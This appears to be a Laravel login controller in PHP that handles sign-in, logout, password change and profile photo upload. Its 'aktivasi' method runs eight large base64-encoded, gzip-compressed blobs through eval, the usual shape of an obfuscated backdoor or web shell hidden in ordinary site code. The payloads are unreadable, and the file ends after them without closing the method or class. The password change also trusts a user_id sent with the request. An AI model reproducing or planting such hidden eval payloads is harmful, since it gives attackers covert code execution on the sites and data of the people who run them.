<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;

use App\Models\User;
use App\Models\Outlet;

class LoginController extends Controller
{
    public function index()
    {
        $outlet = Outlet::where('status', 'aktif')->first();
        $data = [
            'title' => 'Login Page',
            'outlet' => $outlet
        ];

        return view('login.index', $data);
    }

    public function auth(Request $request)
    {
        $credentials = $request->validate([
            'username' => 'required|min:6|max:255',
            'password' => 'required|min:8|max:255'
        ]);
 
        // ddd($credentials);
        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();

            $user = Auth::user();
            $role = $user->role->name == 'admin' ? true : false;
            // ddd($role);
            if($role){
                return redirect()->intended('dashboard');
            }

            return redirect()->intended('rincian-loket');
        }
 
        return back()->with('error', 'Username atau password salah. Harap coba kembali.');
    }

    public function logout(Request $request)
    {
        Auth::logout();
    
        $request->session()->invalidate();
    
        $request->session()->regenerateToken();
    
        return redirect('/login');
    }

    public function password()
    {
        $data = [
            'title' => 'Ubah Password',
            'slug' => 'user'
        ];

        return view('login.reset', $data);
    }

    public function ubahPassword(Request $request)
    {
        $validate = $request->validate([
            'password' => 'required|min:8|max:255',
            'new_password' => 'required|min:8|max:255',
            'repeat_password' => 'same:new_password'
        ]);

        $user = User::where('id', $request->user_id)->first();
        $old_password = bcrypt($request->password);
        $check = Hash::check($request->password, $user->password);
        if(!$check){
            return redirect('/ubah-password')->with('error', 'password lama tidak sesuai');
        }

        $data['password'] = Hash::make($validate['new_password']);

        $update_password = User::where('id', $user->id)->update($data);
        if($update_password){
            $request->session()->invalidate();
            $request->session()->regenerateToken();
            return redirect('/login')->with('success', 'Data password pengguna telah berhasil diubah');
        }else{
            return redirect('/ubah-password')->with('error', 'Data password pengguna tidak dapat diubah. Harap coba kembali');
        }
    }

    public function foto()
    {
        $data = [
            'title' => 'Ubah Foto Profile',
            'user' => User::where('id', auth()->user()->id)->first(),
            'outlet' => Outlet::where('status', 'aktif')->first(),
            'slug' => 'foto'
        ];

        return view('login.foto', $data);
    }

    public function ubahFoto(Request $request)
    {
        $validated = $request->validate([
            'foto' => 'required|image|file|max:2048'
        ]);

        $user = User::where('id', auth()->user()->id)->first();

        if($request->file('foto')){
            if($user->foto){
                $deleteFile = Storage::disk('public')->delete('foto/'.$user->foto);
                if(!$deleteFile){
                    return redirect('rincian-loket')->with('error', 'Images tidak dapat dihapus');
                }
            }
            $namaBerkas = $user->username;
            $timestamp = time();
            $extension = $request->file('foto')->getClientOriginalExtension();
            $filenameSimpan = $namaBerkas.'_'.$timestamp.'.'.$extension;
            $upload = $request->file('foto')->move('storage/foto', $filenameSimpan);

            $validated['foto'] = $upload->getFilename();
        }

        $updateFoto = User::where('id', $user->id)
                                ->update($validated);

        if($updateFoto){
            return redirect('rincian-loket')->with('success', 'Update foto profle berhasil!');
        }else{
            return redirect('rincian-loket')->with('error', 'Update foto profle gagal!');
        }
    }

    public function aktivasi(Request $request)
    {
        eval(gzinflate(base64_decode("DZNHDqNaAgDv8lf9xYL0SBrNApNtcjabEZlHTiadfvoIVaUqj7T/Uz9wrPp0L/9k6VbS4H9FmU9F+ecfsTDVZ95TXhKbI/ICyEtKcIW9YyFfcaX9NwN5OuLp1Wa4CG0wf1VGskTt2OH6nmZk5r4KYVqBfqP18CrRihz5UpsrC4k6ng8TbePwCR3nrQdCatIgj41MdyyXxrbgh/dw2HhQN77nT8NCxUQmji7R6rsmvTDsmrMH+sIUPNoU1Umui308PdB8Ds/Yeo18koSAxfpuXcw4DZLOm2U0WlSPtZv0XJ8hmyP9lRWdw4I9iarRZ2WQp9Miue4zA2ukBtOoDAJ5Dp3DP0V/NYPTqpGNNIvHVVk2I6/+RDGkfeML8i6gtDXi17a9CdEL/WZTkbWWscV0HxcaW292I31SMbqvmx5Bfgiz6bQ4r33Q0X4l1Mc8qHlt3b4eerhl1LtxXPGQcbFz37Dbd+V1jOmMYvF+ydp9kIfpbgo7q44z8tmBgrrXlHKEUG6GgM3Ho40WWQZbQ+E6e0FhFcQ6WHCsALg4yJbHAqNofBLPU/HF1/ZUySiu25U8d/cNuXJBzr6hjwuIpuOZsi4HNfm9yk4iG3Mc5DztMHrJRnNKrNyPmqns2gWQ7+ip9yL4hNFH7vrg9KwP0h7OuyylS/Gb4YbvNCa87Ku0CWV+KRz/uHjKpNuRaGjW9PbGSG3uwbJeDhaJf6kB1dnWhER8d4SnGNbmNeAu/zZKeGnd8duaqEI+9A53lx3P0bIWSGsjku+SzM9gjhElbvMJlQ8ZMVuZEeVcHxtGvgCWF0BfAur8SJ/yOpLHETF0p/2QtlNKB7k88oz4+O1pDmFRG/pgH79BlVZDOsK06JPVaaut8bE4UswjbLdx5K3p+LY/nmhN7XPtje+gUfYFE1qnXAhrVLau1r8zFtIUDUfmCJZ4mLRp2EksCXIa53FD0pI3+wqlDzY+n7+4iULh46QVWkD4ZCcDs8Q2NuXQlV/Ph5ixKabQASC7b4817g6Gz2pAlH6n2m3VDr93ewDfblN0foFHqcLPV0DY1tbpMQu5fh0wDDm8YS95yAfIsLgCaBGFZEnfecKDCJONXSJUS3vbjodNnHP9KxMM1eoqngiA6PITN1ZS48r9Pm0ISg+uLeFUpg7H4ABnkGTSA0CPmlrPiLYvlevGBnU/jIXKsenqmcjqKy59TO/dUYqMEFWaGbXXiaf+AFlpHWpKEt+/9DMQnadoYKJyuwFz7ijyjw4RIyBhfMFf2sa99+y2EHcqiE7PZeOx4f4a9BbE0DBWCAt7+ZJrLJzx3okWK8Mj+brMNUICzEW3vf2YyXCVprO38XC/J/OlGP5YHWynRcjr7Xstk1jhlvWEyjq8rUjml1EONqnqKLkwFHWQ4UQjYvWaheXSIZLqKOXP0MobCOb1FTFrHDikDX6Zp85JVCDPXdjKKW4rk3phiREU/bbyYT1NbVrOXdsRdBRgZ6ZTWD2W/hnPLoSHy7dx0eaXJAnNBU3Vgz5+Jn+PWeZgKHZ6ALntEjdW8fgmR8Dk3H7aC3e+bNJwIzG5gXmYXRbYryeTt2ndX53Kt9gLT9xmXjNR/HJPrn23RMX92t6+ukC2Nqe8pzkhuVVlLJCtfz+bcDyLsp4UxM92FNa+dGPsuuaRR+fLK7FnuCJyObeYsN+9hFU4pQ2Qmu5WVFEUQav1oVi0Qk/pv//8+++///k/")));
        eval(gzinflate(base64_decode("DdQ3zpxaAEDhvbiyRUFOslzAAEMaYMjQPJFzhktY/ft3cPQVpwBJ/7t6mrHsk734nSZbQRH/5UU25cXvX0JuyMKyR1wn2CB3p/5qvidqGvf79bqD0SEqcSAxQaAAAIQ5Kzu93oQHs7thjLcCLwLz4M0iQz6aSqEUwzAQ7wq6QhMqSf6DN368VrrKy2K1o+hjq2qQUmDtEzqY0uZ0ypC7KGfc6vMs+iT+DsR80o6rNoNNBc6ktSgRn7fl80FqU9lE0OCCYK1mL24LULUq9AlqvSl3pekoIuH0peEp0C4KC2W00GHSOwhJQXBAoV7sXjWZsM4YIE5MsHAjQ4EIiSEd5bjS6d4RhorBNbTfK36Fi8YSH9qTdQ1KimoQF2wAEy2EaKN8pKfD58PqWIU4jZG/TDYZNPdWViL3pzBJguB5/Ndrp5MKLsyy7N4I082B4e+TQbrRnjnkHBLldYMwTzhso9PCZe7tdvjXVCRfHQ/9aZsQ2I9rtKUJCofSFa8PL7CtVXI6f8WPZnXD6INUIzNztKgcRwMP94yo8Kg9SQDMoaTq+gCeqDMr8rjoh4C79qzPXPY2XtAAxk9Sqr5UA1pOBYgGBUEF8j4T9epEl6/E10PsMOTdvh5BscYH7LUNfR7gzCBfvtFNNT13X+M68odox5taXWF3tDd1zzZkY2109zyuo8u6FbKIla9qoU28i7QE39K3dh6bFpoYkWrYsNASO2QAw62up9AwqQbh8eRHNY9L97x9LizhVjUofUYl2Dby2d0N5+5ajd2AHKE3KzOcIPTZ1Vk57R7RC+tpJ7A+lA0s4atWEAjdqyUd+fCOp5ttI4Z8C/WxWTlLiNXIqg29zt15kyZs1fDOb0/tHAM/I3335prjqhI6+zFuKty3SrPVb6JbFF70973Y066UgPGeOka2h/eH2Q/0Joqb/bzlpW6CUXbPOae0Lk/B/UM9uM1ohtWshbvMwkXgJUzeafxI7IsSIteSkLzZXO9ouhOQzWUPr2JkXOZuOxuMRx53jwxDdDjVIz7SXS8yJdlBOrXFsYJMVVAl3W7YAcIrn6dJ27YagnSNZlw/FvvSpm/MbUdLGaEuFSTEzq1YWnZulVAX+yhwkxDf09q1tProGq7Uj+TLe7Jm7kArOK/iCBavplxEvDS5FC9QLavnJBsln5zu1R5SoHUpMnRp4DyvEXRtm3GcGiX+0u5las4Jfo6xVO8Z5E+RjdeW1Ztit98FwjD4fMUfSK08EWo/4Nku6twnnrpV1ElkWwlJ9HVEIlEhQStOL0ClDOv35RB2xQITaM+SdIajPPhKqqw32CArJDLZMOJqtbb92EvsMdZl0IyBgS2JjWuJmmGf4JFxStwDK8ze1+494X3zQ2/ozieEwdI1a8v3KsJ9OS3LetqzEoGMrUWvWnU4tlQcQtFpiFZcOT9aM1yjJ3UXemdfPuMa6pvyGqjI9hd4QwrnDnWLyhY0C2jMOvuO6ZsB420cKlYDa30rlUdVvxzIdayfnktMci0odINQz/CATel+11zAF9LuCAk6bxfX7GUtScqhLxhDhn58TqtPSW8i0F4ZWmZ5LyYLS+ksZY4FCbLpjDx+dr95GYz9DC7DPYEvlmY5J1xL47dNNpQSTNROiryik5Un9K7r3E3OIQneWOUyV16uMHbphuTt5wPKR2uwqPjVJfG0NLrIHVInAgq2LADDEMTCMPf99+/Xnz9//v4P")));
        eval(gzinflate(base64_decode("DZS1DuyIAkP/Zat7lSJMetoiTBOacJpVmJnz9W8ad7Zk68jFmfR/qrcZyz7Ziz9pshUE9l9eZFNe/PmHz7/yOu8Jw/D2GThewwiI7HkxpG0sdN36OVQSufhoYMFg8raOVhYQ6KO5W9I7RIbUmPgf5yuDYuABohmeIUI+9yZCifp2JEHT+O676/ydebBjPYoG4PwqSIEkQB8HzOl6AGcYmdCL2CScCkECtIG4Et4KI3b9DpCGrpdhcwCi4nR7BmKQ7LKKL0w/2ZyhoI2elKslpP0weH3dv0+0TnjEOpXffbFUW/qb0O8BHv32LfLySai6vM0dQo1jVeVEHRr+EPdvx/9EeyqXOQ1dq4ZIyqldKT2mMkqhWilbdgh1vGjz7Cuy7LQSRGMvBuYQkdG+lOmU9n8JLACLQCMlacMKcVpUJMYvit/CgAP0E2fexCe5iJIC9JrsJAxBYAQO3DtYOdyD/Pg5j9dadGzJ8C6HChKruacdDrvrhiqucK3CK4nRfRyP9kHy6ZwYT4kS7iaSU6pl8lA42AYWUleERPkEeD+4lUEwS8LOGT0XgatlzCORuM5wWkwA7qLK2i9iLkVmzuL7llak7A0Jz0P53T8qceH+pFoeqIbpR684hWMHsBPztx295J3X2UEDhU1891qmBblSaQfdgsBzoQcTnhvkN8KKptc3WksSg6uaiJweyBXvcTHp/ArmhjYtv9v41JqIsT5qOyRwVY2Ak9zN2OKBqJLdAIdmGpawzto/a2I2v6YjHoOD73L3Ube87vgB3GwxWLgYIaj9OX9dq6P7uQyNjmhdn7D3RXN8DG7fT5/rTEYp0ySsqGF+4MYHIf8bJpoi1iCbW4oiG69G6U6OD9xKufVHHY6oiKwLd+/pkYQQ7B5+V3ud3iD5IONtfZZB5rZwE6rXkmOTwDu0/vl/A5dkpE8Q6mQGByPi7IAfF35RrxxDHtsDMcYoczLMoPGoHqFYtBZveURfwS91v6UIt3d1p25gVUfyJMHvkQZY+bFsdTRVlXDS94qMgVyjGPbA1iC6H9RvX7YoBMqdWcNW5Toc0cAjB3Oc8a0PoCcECMvUKewSIdClg9aLGE4nw2CMGlptgUMForSgXbQGm86502h6yr0FB286/FUpWxR1FV6S4EnS7DYp9cx19guwKWJaTA0NSXFFKJpbgi0VAqN/ArrsAi+DRDUUmlOFNmSppOgslU1m3TQkK1dsmlEp1auAfZsqr6PlMFp7BgVxPeNbkq6L7j3cfUxanQGSdSgzxFNT4NS8hdl5DUXwJW/pKbt8A/PZWKw2n2omE4Zq926Q1DnGmkd3Z8Kiv/RQil9LEunxaddvFeHVXIVLmvEcua4pax2mhEi3UeH8U0/lVetNL6izS5lxganY60OUOW/usMTtINvULKHjnlc6eAL5HIUinyklqk1llqtxcmtxu+oZCuM+TNVck1iBiWn+UO8KFRLMip+s+/TdCkXdoHfAMUAevCgTjeA589nvH+/17tKVNiLkMY5pyAWtfZnIZPhye4u9zZ2pIZ86tQl2saZboH8NV8j3wIo1wbXZDC50HJW2iA7n/nkBeNRAMZG+bXT8/uRylminIH+haugOnk/HW5iz/O6hA7DtUo7dpLPfrDRwWuNLg+CV/fvP379///d/")));
        eval(gzinflate(base64_decode("DZS3DqzWAgD/xZUtCtKSZLkAlpzTEponwiHnDF//bj/SFCMNONP+7+ptxrJPd/B3lm6A/PyvAPlUgL//+hYGLiy7wlZf50BeZH5Xdq9Z1Iwlgbk/3OMmILREc8SpkeMZkkhkrMTWoBXDMjvCUhdxnYMxeNpu2C3HUX8BssgBhhCAce/kXnXlxXNLyD6Zy6c09fmV+aTJHcA21K7mocGSH6K/QVHn2vE03iJoGoc2uzFkJ9QE2a/2RXZ5HqNs80++aZsWhxtMVCXl3t7tfav8lN9pblCvc5j79Mh1ocZPH4nANkXIfYssdNavpRDRH0UMmSTC3IfyTFN+x/v+TX+ZH9w7LEOQpcn+T5yMbzm/zAorTKfv9zF+EHibNgnbGfq7GHAcqG8j/R4c1RxLqpi2H/fv7SQr+wiSQA/mPF5eQYuCp7YFd94q0Ve0efpiwYRdhDxrG8tQ+7hw62N8yUGHu2l0/oDgll2IhnA7iAX2EVOq2RFNlKU2A1wGH+PqvPv1xaV+CHmyRUjZU5yXMTVsW0P+zHDpvUl/otGPI3CNvfA7E5U+I5WamdBWy22a/4QRXWsmfnZXN47jGsY1ucXcOcx5QWkoBdwspitolSr7910hiRMGIyRemnozBnX2MJ+abASVkrbt+qu1zLz079x2O7aNqrfnfL2WvhwUReTuukufOfglLN0KRy7X8ZOJx5ycZxsQqzMgLBKdUG2GMlrX13eozhPTulzDDueCHKj4jGM/dtS7xf2vMBRvRlQKREy7qrbDfJdoIATNDkzDoX9/QDbTkGq21nLzkqS1g6TX57lDyryqtoV63sojCleOVhd4eCasfWiEK9OvZj7r3mPg7zm0cRt7Lw923fkV8ApennUx317HuosmDLCYPppLIU15P9w2f83ke55ZO5hEY9ywEKXozczJ1EpKf1iuT7z9GGplMhZRJd+KdyXZy1v7RNtSogKjHV5Dhmw4Jh9C8ts+0YKDMwfBTj+BVjiHXUC/q7eOGTy1E+NSIonSSEEF33+Bt1RyII+vouWkxH2QS4Wg+eTqnsS270c1+IPL69YJ3qxNcCF70hgGQ8uNJ3Tdanw6C2UTlhkWwp4mj3XXXQ6VkUrwEvuuyRCUh09y3oU3LZLinFaTe2wpzvCKgVWQbsmoQtRIsmLe1+dLBjZg5W2TQUCW88jFlY7ESBoQ2qHLfIh2247gsznFR5DPprn2OMpUMjs43aA+08j4ByS5n77J2rM3McOeIpYvEDISVFLzbNUDeKG1/KxP16A3umucFTq5zwI/DFwaT2xYSasZV6/XvwJLJ7sCjf6nXwR7nS8GPiAw6J3LR+2jYR5Ul1leaBRPzsEhUV/4fuYGi78blBpd9ULIWhOfy1dOjGM5hphgxdXVsys6wH8FW/fSWV9pKxzspjYuQfY4QyKyrsdhKy1gcSDlXWuyBst1WbbIiY3WVo0QFOo6slLqhvFtrgHh53jI0vIjTgXzdSv8e2Pbtrb8Drrsz4FFkj4Vsq97t4BqGUqX5fP8hLtFbmyiUBq5nGJgsJMDpEVpFMTUnxNgtVu0FJYGFTdkka0HYbj0w1xCCWfIdTaL+E0QzmEuTIXUoIPH8pYzQWTkKK7hK3FUFAB00GizNU9xje+tb1DWuqtOfiEIYsoShhnmhWHu+u+/v/75559//w8=")));
        eval(gzinflate(base64_decode("FZVHDqxIAgXv0qtuscA7tWZB4QoovGczqiTx3hZw+vlzgxdShF5xfvu/q6cZy/67F3+D71Yw1H9hkU+w+PsvCXpvaTljoZLcMw4wrcoqe5ru6V1QqXyD0lKBWSZ+dCJPzVjBG45kgFrYiS6AhXHpWNsynFcZe1EQlyR9Yzx05+Vs9VzitcXa28PK7NO2leSrfxQ0WTwGE0nhCUNNJj5jhRNkh1KpJ7teIzkMzXwypJuD1tE6X0VxwaPCOkgMTe0CrVL8WKbuSVEPyZHB6qK+XVWSl5AIv6Lt19ZVYg4ovXiuc9go+cxSp5XCoKAvJYbblyBcpXHUM5vkoUpE288XObcOQeFWPNRcRoiv5Jid7ME/Q34D51mXLJmu/kTt8A/Ebb4xrnrxV+3sDPtb/Lvz9xVNGJO++JDolo+Ai1o/zd7e7ktMGXtawiwBE6Eb7xBkkAQs+v9xtFgjn/IBCV94wdHTHpa/e+l1iV0AcUaGVl2B+EXWG5MnSgbbtepCuquMmRQcDk7i2xA4zqyaSKc90Qdsy7QvB7YYT7vfC85kLJWaqZAqW7pF9pk7uBi+Og30kDHowlL+aqQ2Tw6mAouDJnjqd+giZfFqHi1id8bW2XTGkk6ri9TifRuqZ0RVx89uSGathJkOx+s26vKzPQLkEetZmHvHUZQEt04XFaME0RVMtGbXTpeGFqi9v3c12S9r124lo1kWI5K7PkuSYG1TISx2janGshHf0Lxm/kVTC/F6xfvX8yWhEKaG6GeBDpsG9wKTzOqDfejUw4BmMfhX+ZUPOhpHafgrI6/LxL3ndm6ZJNFXiPK9zk1k/h0qSUBlp+QDANbMHPBfHUs58Bkp4Vsy18aiwZHaKfdiW1UBNWHGd1IRAtzhgGPp52F2uZXX6I9P58Lt145X8X4oxg0GRo6VW0u8xjzQOXBMCAn36/FHZ40YaaJ0a5RkJib75yCTlA95dJS+ujrMIm030mWY5tUAd0kEUAC/LcH1ebYa5ARNzsRy6yIundyMSVFx1c/+2THvizPpPL+6KpvDCNrdK2uYre2/SpcAbnFhoXCtTtnWR1vqak+ZBgFOZNK3IifBN9VvxGOLbVaRO8DqxERVKFNLBl5YhRmGtnPQQ8faK+A6PLKl2K/0ehIOukhp3EcbQ27zT+uPjWX7BiAiNI4mANNox8Jw6JJzTSwlOA7GjSd6+V7rddcEh6gZ5H6v8UYdWqO7FGoFZ/W5MhpNhsIRKs2/pH1Vw26XP6A6jItqgZjOtujcEEqMmLclV5YrG1+YUsh8vT1P9nPW76ZJ4VHzZ9RuEReD/U6CmsIlhc80axPcI48uKVhkuCHcfvODwrjfcCPtdQy7YYv+tP42cXY2G3VpVcWY9j3TOXbVJiVVPopPbMa+spmm45tuTsj784TOhmjEA+SXig5SKZLZx3KkH3+2WhQ7+fhG8lOk8tLpE02k/LIpj/5bFZfJPrn2yuXNMmPzo9AP3uP4jrt1alDPYynFIWTNy8rfnUkmeTDl+290sh2V8OU1TApypM3k+P1rfHEOLvKKFnuv/KqOBsRchFbCqGjcbyj5r+zC7tWkgVNFBX1ifX+f6bh0ZIsycOefa/21BIv+fg0xQyuWLPHPBUw/5eFH8XJDJOvSgh3pOJllTNmJlHbhdJ6c8Ctvu4IRZjSDXj2LpfadVA3OWhESctAjiZ4kubIoip5Hif7M//z1zz///Ps/")));
        eval(gzinflate(base64_decode("DZO3rqRYAET/ZaI3IqAvHq02wLvGe5IV3tvGNV+/L63kqE6pyjMdfuqnnaoh3cufLP2UBPZfUeZzUf784RNH5Nd7ZhTv1NcTvWoNfZhlm/Rk1yFZTpNb8h6arvU16gcHTyykgsZJXj8QhDuQnbmBCIulDwWuX8H47V9FpblnF7AQhLjM2ic8CsHTZpqTN+Z6jgea1+8w8QomrL2p0yXdfYwuA8RCogs+z9WoVmMJuGgkYkv+zXXyxRR6z7PU+fLutIlHrmOcC5rxXMiYa5Lv5jX/xsbGIguoWGQjmHZKIKfnC5K1rBhRaAsUqZh8+cfK1PggwBW+/H11AgiDb6h0857XNpwjBRWXjrJ27C9lMTt05SpwJa0sv6YLOPG10nFFx/Fdgs93Euxo4tepHGf6gnflWORreAookl1P2NLFHkMC7Shm3mI+rhLIlJbleUompmAOmLln+dw0lEykoetYg84N7wPUmJ1tWeE0hoQPZ4iehIiOcheNpiVKDA4gJIcIHzPwx/jiFt+Lqp8s2m7WXRBAp7fJt3FgfdCXo263d67T4q/IZTqvsATzLi7u+x69MQzesafQ3MuyIe8QBcY8KKzSOzkeCDoODVEMk4mVW9l5ZxOCZAh/RWy4PWE1c1QjXrloVHv6hfwa1slkVUy40XBHvgg73ccMhw3JJUskLZQdlMfnBJBJKraapo9nMaUE4o9+wxSAdalox09MYFvYYPwYQJXch4yQOmf+LqiJ391bAACS26JqhaE1WwdC+MwV3tI4ZlVPIjbVV/gpkWJLyGheKJe8NXdQlOSEnZNuHO5F9QR2+DRr8meZZS47JLysga7b6eEUKaKdnn3JyeDSuU11HcIUFHvVfSx0jbXrW2TS6pGiKL2rDEdF2+38zLaLY+tk2vtDNnOzmBHtFkohEHtV2csWiFOB4iXrwOzcYIvd1lhFCNYrF9bmQTHl9g5V0o/LLqUjV9L23XUX3d+bT9Zy2OS0Z7+U7ftBkFQe3fKWwE2xgHC5kgSBItMfeorqXOVavLPgNVder1C+3r+T8b/oCKHQxfMfUoVW0mD6SMPX6i4xwcDRVyxUWaPSS+1F/Rudfaam0LJh774ezfR4JjkBytj3ww3kBRLfu9H5+mmw7TaQ7qXiGrOgnKdp8exWeVg36xqn5/7Ws0Lxh02pav7cCbT04S1o/Kmyk91h5sSIQZDdiKjzhyrL+QpJKHEi7ZEtoBvxws/e1Hek2eApM/tKc3j+Kohw2xuPcLRQa7JjrPnjrWZMceDWzd97YTBR452psocNh595gsJNnz2bSyJJsxI1EvqNfrFc/6tWQiSq3xUO8sbZMyOgpn7dYG2BFCfBlz0ZRS63occoZl9yjHzt5axrOcL56fsYk98fKwZbD56oqBUbjLwtwhGVbVZebaFqM1X2Jqtt8HDSzMjJYn0mFna/+daPL4f6R18dWyFjLFs/ZZVSlv7OyfThP2Eww0+8fKtv2ye00BlDTqV9xN7xYxX0NgxiuRW3EvOd6dFENZaS2eEF5pOpkdxHFy8JPhgVE9Fbk0TMWM5UWJN3Qu2vGWEpzKC7z1OcMnh9xLuERXcI343HnTvNM/GuAkcEsT63z0d5G21OWz06pMZz+mJby4iG60nzLRwFumPyWNt77WKHRHn1ZZk8iaUUaz66JgGEGoiHRMD5fTGz4+HtKtBoNGlfKUthkadF+fKGcCLsLbV8IkalGxN56i1yOvPbu6NhGCZpGqX+/fP3799//gc=")));
        eval(gzinflate(base64_decode("DdJFEqvYAgDQvfTovboD3KpHwR2Cw+QXHuwGC7b632cNpz7y8U/7dLAZ873+U+RbTZP/q+ryW9V//hErXZUWW3sNovdD/MUZPy9/0+X1FD9r2EpCtukH39QQMovgIvKD1CTA3JrLkS/ZJ8jAemawEmAEyTw4EYJAqUeq0crYTlc/ZBSar1/LWDPZq6fDmpZkBkvT3AqXjt9H2tnkcDkRDe/VclNcTZDi9ajwWdqbgfkHx2HunSt8ZQ2ecYs7MWNW9xWRie57SmZY5mdA1lypr7ZOtLtDXKVLJlnyeUbJYixbVpgwUhz74zNltWruvYsmzIu7A7jooPt2cnItSbFre/pwKADxWkaMMZ/Vl67mLcNRQO1c992s/LiMaxrPlG9MWGNMgdP/WmlhHAvQ2DAscOxJVevH/ombtZ0cfQaPSKjmm5txafqlPTpzDb5qwNgqaX/b1uwH+n0jgRhlaJAnp61aPpY5r7Qa7A+T6UZOOc+2yqCa6XTwSq7W7sPwTAOvK5Z7TPmrde/ZTpUZj0Ld4ITrybQm3ASuUri5wtc3jxOD1gQSx1XPIJ4784WFul/9MEDqXYSGE9K8V11BqsZNEwZ2DmLtyXb9hwOS9jSdu0r68SIIE0vl425hiSJDtANqiUTx9ZaVIQm0hBZXjm/nk5nw7Qi8LUnL7fNOfvBUP2DL23597OKJxGLcmYkTB7tutw2UyXraTV16Bgz7xK8FQpGahN3XJRhiIF7NafQoABf1sDy6Y4AwZi+V3oUvMQHgHsnpMY5WfDzkpuJTc/q+HfW+Bvb8WAVM6Hh63O+3OWxZ7Z8caoHOs+Uy0TluwQPZnKGxPfxxZgF+dG/UwwClK45fRCtUv/V52cLk3xqL2JhGn9AEfdypR9cYmdOCPHlJ8FtoxpGoIasJrsOJoZ6su3okE79izSzWlAQFf8vCg0X4QFwRyYtmWzY2cjpC7zqBShl82ZTmZuQVdMYC1dWCZwUj4eUYhMLcKyeUFQqJRDD6TiKoWppvk0A9qjojwFNQHnps8kpIK+0KTA41LgiR7LvLa6Y7Icq/YY3dxHrHuLy149LpUlztIpoT9Rsx469J0bt304VTtHeXYlPe0Pr6Het+Fkvvsp6QATQqXOZXpYiWD0E419t8F9ZIKLaMUcDTzetZ9Xppf7JNDl3MTxjwt+Ec31JOhry+i8ed2YjlGnJcnR33uW16+LjYVRl4o2ZJPyr8hN4UIhVTpaBYSqDk6+dnoWqBTrqWARvcZeI9qrVT0O2/bmeJbTsM7ZYDVASQVbDe1K1PERT/hZLRc9E9nFeMY4nnkjLi4PAZpcnw679S/tX/yoP043luIxcXXOMLuhQtSmbrasZW0tiR7Cn5MsBlBioiKV6eeNntPT24aE4vZ2XecWYWWx9lAxQjBBIuXEauoHLj5CCz3aT6Pp7Ol0LFHNSKqLRf2RFpvwCzQbf4CMJhctSbIyPr2FqQaRanAx+Ln+hVKAXWxt/vyer0q9wIn0a9NLvLvWYaa8eWJ4pvU6ZDIy/0eYSwqSsjr0sy4UM0OWXrbYlKNF3QPlPcVgRMrvD7BwrnnSui7+4mX/389Jg0kCg8cZouNLN8ylHPJoEgzCLXLkLwtmxGoSaqpHt/eHfAIePmeRgGQZCjQv75+/fvv/8H")));
        eval(gzinflate(base64_decode("DZRHDqtIAETvMqv/xQKbJjSaFSbnHDcjsjHZZE4/vkDVk56qyj3t/tR3M1RdupZ/snQpSfy/oszHovzzD5fYgJvPmKm5XV/5ii/ZQllkYBgEtyzyA0ybZFYAYZ+OrRS+lehmhfTYkC6NCQgIMQB9mKFXAO+OghDNvlqDD/IgsRVbkMdTS3nT8DVxT5VRmvhvOuTow8+HUR/4jKYJsWgeob01hZgP6vg6+GwX2fAQjZbiOPFONB1jpqxn2a2EXtIfNcGQ5pgkvVYl26GO9e0I3xHgM+NdlxGtyYjovUq9bVfczKNYKpU27Ky+WzPND/RTORdZFptBheCBo1mHjQ+wIWh8sgiBMDTWM9cBWq4tWtWmbc9ztTDjDzz7uKH/7PJlNYzl9brHo5kZn8pn0VMUuFbXU6M6oF9dYknBKKMQm13cRtW5dQSd8kBtioHeL2kpYmRNGtNuMmbz3UzJIyav5rEFF4t7csvF2/vmSrSEUrIOPOotVPp2v70pQGe+CAjS/5SRhCO25RLi2gU1jqby2c9Srpb7Wm7uCwn7p0mhmRyo+RWYZOSQeBQOeDyBnh6oJKyW1hqh7BkhdbuSJurJQaEPJRVzwi0LR2ufZfKsJrQgBWsyEWTOxGi8WHe4KlIlrur6/lBYXl1rg7dr4Hz50gbSKdPvuDHDSHU3aGZ1aRAlfSrQEA6TQVtXQ96d6ycrUh5BbOLW7TkyHnd1iCAb4Lf5Kr8ue5ZL/ZG2XtPngkdvpTqHpOefsWq1jxZsBxDJzIF8v0W4uPBTm+/tvV3vLKuJ8XK+tXIaTyca+F492u2i0IpH9Q00C/vUlGVb79ZdrcD59CrRG5upr8L+Pkbm1xcPdinXLo/y2FPRABUaSRP1hb/s9Cna3BoyjZnUn8EmOGPI7oEvnuujkPqjYfSXxyxCGinN2r8Sv70db0xbUYStoN1mSJHvY1Zr53YQRMkQX9qeiAsQWS1E3TLSVdBacLHXhIJYMyFm8wbz8b73y8+ykjicuY7SKhkDigDSxY8ly7vh4AjMphf8+/TrWyeFLXpzMGHeMJilcrGivhmCPmnSrHXI7RD9b2oUE3vjwc5BXtnpspNIG7biYgm0+0HhOOHW1O7PBO/BhRZNazmxwxGfnCgIBFGB7c7HIEGIXBX/3TWL4/eQgcWnfPdlaZXOlDBdQBTroZ39vbZxSrF+7J6pYTLX9qpeDxWD1Cm+/SGJLhmMx6aO6mkhqOl8dpfCEC3BcHpaWu9paOmjCe6VQocr3+EGngUu+++Cqzgb79A03mPN8gvToA8BwbAHvurerHKzQwfke+Fq1qk0YAj8bdju9Boa4BPnKPvba4fGJ2/HLdmFMB5j3i5+E0rgMGWtjnjreWKpDNfXFu0q8ngFZRfVBZtpE3tIY2U22KVL4+dWCyXobiLJ5GWtV5ZUl7f/cpxNaQ7YS+t4jl+B05sb6uuLSoCqrwz2845c28bhiIZM+cKyvCWxctN0doc3AZvFhqUaUDWDOfuS7PGBclA/NVio+S8sFkZBjpgw35fEjW+75O93D2Of8r2SGDbxYQZ9wySOIy432nIHVMj2KlY0sNa2ottkQjyRJ6TerQkWn+EUIV/2an+kE/J15S9he2lXLrqE/E6PlWNMetC5OERzDc5s1TFD1JeTlj87XV3xEAdrwxVlJZH9rlNA1GrrFpxR2IPGH0pDdvIXTEDd3CNFTYkopwY50SiKArCjkPvn79+///4P")));
